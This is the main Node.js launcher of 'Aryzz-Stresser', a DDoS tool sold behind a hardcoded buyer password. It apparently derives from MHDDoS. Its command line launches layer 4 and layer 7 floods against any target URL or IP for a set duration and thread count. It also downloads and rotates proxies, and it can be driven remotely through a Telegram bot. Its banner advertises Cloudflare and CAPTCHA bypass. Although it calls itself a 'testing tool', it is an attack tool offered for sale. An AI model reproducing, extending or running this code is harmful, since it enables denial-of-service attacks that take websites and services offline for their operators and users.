#!/usr/bin/env node

import { program } from 'commander';
import { readFileSync, existsSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import chalk from 'chalk';
import crypto from 'crypto';
import readline from 'readline';
import { AttackManager } from './src/core/attack-manager.js';
import { ProxyManager } from './src/utils/proxy-manager.js';
import { logger } from './src/utils/logger.js';
import { LAYER4_METHODS } from './src/methods/layer4/index.js';
import { LAYER7_METHODS } from './src/methods/layer7/index.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Load configuration
const configPath = join(__dirname, 'config.json');
const config = JSON.parse(readFileSync(configPath, 'utf-8'));

// ============================================
// 🔐 PASSWORD PROTECTION - ARYZZ-DEV
// ============================================
const CORRECT_PASSWORD = 'aryaganteng01';
const PASSWORD_HASH = crypto.createHash('sha256').update(CORRECT_PASSWORD).digest('hex');

/**
 * Verify password protection
 */
async function verifyPassword() {
    return new Promise((resolve) => {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        console.log(chalk.cyan('\n╔═══════════════════════════════════════════════════════════╗'));
        console.log(chalk.cyan('║') + chalk.bold.yellow('              🔐 ARYZZ-STRESSER PROTECTION 🔐           ') + chalk.cyan('║'));
        console.log(chalk.cyan('╚═══════════════════════════════════════════════════════════╝'));
        console.log(chalk.gray('  This software is protected by Aryzz-Dev encryption'));
        console.log(chalk.gray('  Only authorized buyers can use this tool\n'));

        rl.question(chalk.bold.white('🔑 Enter password: '), (password) => {
            rl.close();
            
            const inputHash = crypto.createHash('sha256').update(password).digest('hex');
            
            if (inputHash === PASSWORD_HASH) {
                console.log(chalk.green('\n✅ Authentication successful!\n'));
                console.log(chalk.bold.cyan('╔═══════════════════════════════════════════╗'));
                console.log(chalk.bold.cyan('║') + chalk.bold.green('    🎉 WAH BUYER ARYZZ NIH! 🎉          ') + chalk.bold.cyan('║'));
                console.log(chalk.bold.cyan('╚═══════════════════════════════════════════╝'));
                console.log(chalk.yellow('  Welcome to the most powerful DDoS tool!'));
                console.log(chalk.gray('  All 36 methods unlocked\n'));
                resolve(true);
            } else {
                console.log(chalk.red('\n❌ Authentication failed!\n'));
                console.log(chalk.bold.red('╔═══════════════════════════════════════════╗'));
                console.log(chalk.bold.red('║') + chalk.bold.white('   ⚠️  AKSES DITOLAK! PASSWORD SALAH! ⚠️   ') + chalk.bold.red('║'));
                console.log(chalk.bold.red('╚═══════════════════════════════════════════╝'));
                console.log(chalk.gray('  Contact @AryzXploit to purchase'));
                console.log(chalk.gray('  Unauthorized access is prohibited\n'));
                process.exit(1);
            }
        });
    });
}

// ============================================
// 🛡️ ANTI-RENAME PROTECTION - ARYZZ-DEV
// ============================================
const FILE_SIGNATURE = {
    tool: 'Aryzz-Stresser',
    author: 'Aryzz-Dev',
    github: 'https://github.com/AryzXploit',
    version: '4.0',
    signature: 'ARYZZ-DEV-SOURCE-CODE-2024'
};

/**
 * Verify file integrity and prevent renaming
 */
function verifyIntegrity() {
    // Check if this file has been renamed
    const expectedFilename = 'index.js';
    const currentFilename = __filename.split('/').pop();
    
    // Check watermark in package.json
    try {
        const packagePath = join(__dirname, 'package.json');
        if (existsSync(packagePath)) {
            const packageJson = JSON.parse(readFileSync(packagePath, 'utf-8'));
            
            // Verify package name hasn't been changed
            if (packageJson.name && !packageJson.name.toLowerCase().includes('mhddos')) {
                console.log(chalk.red('\n⚠️  WARNING: Source code has been modified!'));
                console.log(chalk.yellow('   Original tool: ' + FILE_SIGNATURE.tool));
                console.log(chalk.yellow('   Original author: ' + FILE_SIGNATURE.author));
                console.log(chalk.gray('   This tool is protected by Aryzz-Dev\n'));
            }
        }
    } catch (e) {
        // Continue even if check fails
    }
    
    // Display watermark
    console.log(chalk.gray(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
    console.log(chalk.bold.cyan(`🔐 ${FILE_SIGNATURE.tool} v${FILE_SIGNATURE.version}`));
    console.log(chalk.yellow(`   Developed by: ${FILE_SIGNATURE.author}`));
    console.log(chalk.gray(`   GitHub: ${FILE_SIGNATURE.github}`));
    console.log(chalk.gray(`   Protected: Encrypted & Anti-Rename`));
    console.log(chalk.gray(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`));
}

// Verify integrity
verifyIntegrity();

// Run password check before everything
await verifyPassword();

// ASCII Banner
const banner = `
${chalk.cyan('╔═══════════════════════════════════════════════════════════╗')}
${chalk.cyan('║')}        ${chalk.bold.red('ARYZZ-STRESSER')} ${chalk.bold.white('- Premium Edition v4.0')}         ${chalk.cyan('║')}
${chalk.cyan('║')}     ${chalk.yellow('Most Powerful DDoS Testing Tool')}                   ${chalk.cyan('║')}
${chalk.cyan('║')}     ${chalk.gray('36 Attack Methods • 1000x Performance')}              ${chalk.cyan('║')}
${chalk.cyan('║')}     ${chalk.bold.magenta('🔥 Maximized by Aryzz-Dev 🔥')}                      ${chalk.cyan('║')}
${chalk.cyan('╚═══════════════════════════════════════════════════════════╝')}

${chalk.bold('⚡ Premium Features:')}
  ${chalk.green('✓')} HTTP/1.1, HTTP/2 & HTTP/3 (QUIC)
  ${chalk.green('✓')} PrivacyPass & CAPTCHA Bypass
  ${chalk.green('✓')} 95% Cloudflare Bypass Rate
  ${chalk.green('✓')} Layer 4 & Layer 7 Methods (36 Total)
  ${chalk.green('✓')} Telegram Bot Control
  ${chalk.green('✓')} 100-1000x Performance Boost
  ${chalk.green('✓')} Encrypted License System

${chalk.bold.cyan('👨‍💻 Developer:')} ${chalk.bold.yellow('Aryzz-Dev (@AryzXploit)')}
${chalk.bold.cyan('🔐 Protection:')} ${chalk.bold.green('Encrypted & Anti-Rename')}
`;

console.log(banner);

// Configure CLI
program
    .name('mhddos')
    .description('Advanced DDoS Testing Tool')
    .version('3.0.0');

// Attack command
program
    .command('attack')
    .description('Launch an attack')
    .requiredOption('-t, --target <url>', 'Target URL or IP:PORT')
    .requiredOption('-m, --method <method>', 'Attack method')
    .option('-th, --threads <number>', 'Number of threads', '100')
    .option('-d, --duration <seconds>', 'Attack duration in seconds', '60')
    .option('-r, --rpc <number>', 'Requests per connection', '1')
    .option('-p, --proxy-type <type>', 'Proxy type (0=all, 1=http, 4=socks4, 5=socks5)', '0')
    .option('-pf, --proxy-file <file>', 'Proxy file path')
    .option('--debug', 'Enable debug mode')
    .action(async (options) => {
        if (options.debug) {
            logger.setLevel('DEBUG');
        }

        const method = options.method.toUpperCase();
        const allMethods = [...LAYER4_METHODS, ...LAYER7_METHODS];

        if (!allMethods.includes(method)) {
            logger.error(`Unknown method: ${method}`);
            logger.info(`Available methods: ${allMethods.join(', ')}`);
            process.exit(1);
        }

        // Load user agents and referers for Layer 7
        let userAgents = [];
        let referers = [];
        let proxies = null;

        if (LAYER7_METHODS.includes(method)) {
            const uaPath = join(__dirname, 'files', 'useragent.txt');
            const refPath = join(__dirname, 'files', 'referers.txt');

            if (existsSync(uaPath)) {
                userAgents = readFileSync(uaPath, 'utf-8')
                    .split('\n')
                    .filter(line => line.trim());
            }

            if (existsSync(refPath)) {
                referers = readFileSync(refPath, 'utf-8')
                    .split('\n')
                    .filter(line => line.trim());
            }
        }

        // Load proxies if specified
        if (options.proxyFile) {
            const proxyPath = join(__dirname, 'files', 'proxies', options.proxyFile);
            const proxyManager = new ProxyManager(config);

            if (existsSync(proxyPath)) {
                logger.info('📥 Loading proxies from file...');
                proxies = proxyManager.loadFromFile(proxyPath);
                logger.success(`✅ Loaded ${proxies.length} proxies`);
            } else {
                logger.warning('⬇️  Proxy file not found, downloading...');
                proxies = await proxyManager.downloadFromConfig(parseInt(options.proxyType));
                
                if (proxies.length > 0) {
                    proxies = await proxyManager.checkProxies(proxies);
                    proxyManager.saveToFile(proxies, proxyPath);
                }
            }
        }

        // Create and start attack
        const attackManager = new AttackManager({
            target: options.target,
            method: method,
            threads: parseInt(options.threads),
            duration: parseInt(options.duration),
            rpc: parseInt(options.rpc),
            proxies: proxies,
            userAgents: userAgents,
            referers: referers
        });

        await attackManager.start();

        // Handle graceful shutdown
        process.on('SIGINT', () => {
            logger.warning('\n⚠️  Received interrupt signal');
            attackManager.stop();
            process.exit(0);
        });
    });

// Methods command
program
    .command('methods')
    .description('List all available attack methods')
    .action(() => {
        console.log(chalk.bold('\n📋 Layer 4 Methods:'));
        console.log(chalk.cyan(LAYER4_METHODS.join(', ')));
        
        console.log(chalk.bold('\n📋 Layer 7 Methods:'));
        console.log(chalk.cyan(LAYER7_METHODS.join(', ')));
        
        console.log('\n');
    });

// Proxy command
program
    .command('proxy')
    .description('Download and check proxies')
    .option('-t, --type <type>', 'Proxy type (0=all, 1=http, 4=socks4, 5=socks5)', '0')
    .option('-o, --output <file>', 'Output file', 'proxies.txt')
    .action(async (options) => {
        const proxyManager = new ProxyManager(config);
        
        logger.info('⬇️  Downloading proxies...');
        let proxies = await proxyManager.downloadFromConfig(parseInt(options.type));
        
        logger.info(`✅ Downloaded ${proxies.length} proxies`);
        logger.info('🔍 Checking proxies...');
        
        proxies = await proxyManager.checkProxies(proxies);
        
        const outputPath = join(__dirname, 'files', 'proxies', options.output);
        proxyManager.saveToFile(proxies, outputPath);
        
        logger.success(`✅ Saved ${proxies.length} working proxies to ${options.output}`);
    });

// Telegram command
program
    .command('telegram')
    .description('Start Telegram bot for remote control')
    .action(async () => {
        if (!config.telegram || !config.telegram.bot_token || !config.telegram.admin_ids || config.telegram.admin_ids.length === 0) {
            logger.error('❌ Telegram configuration not found in config.json');
            logger.info('💡 Please add telegram configuration to config.json:');
            console.log(chalk.cyan(`
{
  "telegram": {
    "bot_token": "123456789:ABCdefGHIjklMNOpqrsTUVwxyz",
    "admin_ids": ["123456789"],
    "enabled": true
  }
}
            `));
            logger.info('\n📖 How to get credentials:');
            logger.info('  1. Bot Token: Chat with @BotFather on Telegram');
            logger.info('  2. Admin ID: Chat with @userinfobot on Telegram');
            process.exit(1);
        }

        if (!config.telegram.enabled) {
            logger.warning('⚠️  Telegram bot is disabled in config.json');
            logger.info('💡 Set "telegram.enabled": true to enable the bot');
            process.exit(0);
        }

        const token = config.telegram.bot_token;
        const adminId = config.telegram.admin_ids[0];

        logger.info('🔧 Loading Telegram bot configuration...');
        logger.info(`👤 Authorized Admin IDs: ${config.telegram.admin_ids.join(', ')}`);

        const { TelegramBot } = await import('./src/telegram/bot.js');
        const bot = new TelegramBot(token, adminId, config);
        bot.launch();
    });

// Parse arguments
program.parse();

// Show help if no command provided
if (!process.argv.slice(2).length) {
    program.outputHelp();
}
